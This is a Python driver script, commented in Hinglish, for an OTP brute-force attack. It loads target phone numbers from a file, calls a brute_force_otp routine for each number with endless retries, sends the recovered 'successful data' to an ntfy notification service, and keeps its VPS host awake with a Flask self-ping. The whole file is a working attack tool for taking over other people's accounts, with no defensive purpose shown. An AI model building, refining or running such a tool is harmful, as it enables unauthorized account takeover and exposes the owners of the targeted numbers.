import asyncio
import os
import importlib
import utils
from flask import Flask
import threading
import time
import requests  # Self-ping ke liye zaroori hai

app = Flask('')

@app.route('/')
def home():
    return "Script is Running!"

def run():
    # Port 8080 pe chalayega
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    # Flask ko background thread me daal diya
    t = threading.Thread(target=run, daemon=True)
    t.start()

# Naya Feature: Har 60 second me apne hi server pe request bhejega (Self-Ping)
def self_ping():
    time.sleep(10) # Start hone ke 10 sec baad shuru hoga
    while True:
        try:
            requests.get("http://127.0.0.1:8080/", timeout=5)
            print("[*] KeepAlive Ping Sent to VPS (Sleep mode prevented).", end="\r")
        except:
            pass # Agar request fail ho toh error na de
        time.sleep(60) # 1 minute (60 seconds) baad wapas bhejega

# Flask aur Self-Ping dono start kar rahe hain
keep_alive()
ping_thread = threading.Thread(target=self_ping, daemon=True)
ping_thread.start()

async def main():
    # 1. Numbers ki list check karo
    if not os.path.exists("numbers.txt"):
        print("[!] Pehle 'numbers.txt' file banao aur usme mobile numbers (har line pe ek) daalo.")
        return

    with open("numbers.txt", "r") as f:
        phone_numbers = [line.strip() for line in f if line.strip()]

    if not phone_numbers:
        print("[!] 'numbers.txt' file khaali hai.")
        return

    print(f"[*] Total {len(phone_numbers)} numbers mile list me. Process shuru karta hu...\n")

    # 2. Time.py ko as a module import karo
    import Time  # Tumhari existing file (Time.py)
    
    for number in phone_numbers:
        print(f"\n{'='*50}")
        print(f"[*] TARGET NUMBER: {number}")
        print(f"{'='*50}")
        
        # NAYA RETRY LOGIC: Bina main.py crash kiye number ko baar-baar try karega
        while True:
            try:
                # Time.py wale PHONE_NUMBER ko dynamically update karo
                Time.PHONE_NUMBER = number
                
                # Time.py ka main function call karo
                await Time.brute_force_otp()
                
                # Agar yahan tak pahunch gaya, matlab OTP mil gaya ya 1M complete ho gaya
                print(f"\n[*] Number {number} ka process complete. Data check karke notification bhejta hu...")
                
                # 3. Successful data file se nikalo
                success_data = utils.get_successful_data(number)
                
                # 4. Ntfy pe notification bhejo
                message = f"Number: {number}\nData: {success_data}"
                await utils.send_ntfy_notification(message)
                
                # 5. Number ko list se hata do taaki dobara try na ho
                utils.remove_number_from_list(number)
                
                print(f"[*] Number {number} list se hata diya gaya. Agla number shuru kar raha hu...")
                break  # While loop tod do, taaki agla number (C) pe jaye
                
            except Exception as e:
                # Agar error aaye, toh main.py crash hone ke bajaye, usi number ko 5 sec me retry karega
                print(f"\n[-] ERROR on {number}: {e}")
                print(f"[*] Number {number} ko skip nahi kar rahe. 5 sec me wapas try karenge...")
                await asyncio.sleep(5)
                # Ye loop wapas chalega aur usi number pe attack jari rakhega bina 0 se start kiye
        
        # Agle number se pehle 2 second ka break
        await asyncio.sleep(2) # Thoda break before next number

if __name__ == "__main__":
    # Ye outer loop sirf tab chalega jab pura asyncio event loop crash ho jaye
    while True:
        try:
            asyncio.run(main())
            break  # Agar main function sahi se khatam ho jaye toh loop tod do
        except Exception as e:
            print(f"\n[-] FATAL ERROR: Script ka event loop crash ho gaya! Error: {e}")
            print("[*] Auto-restarting in 5 seconds...")
            time.sleep(5)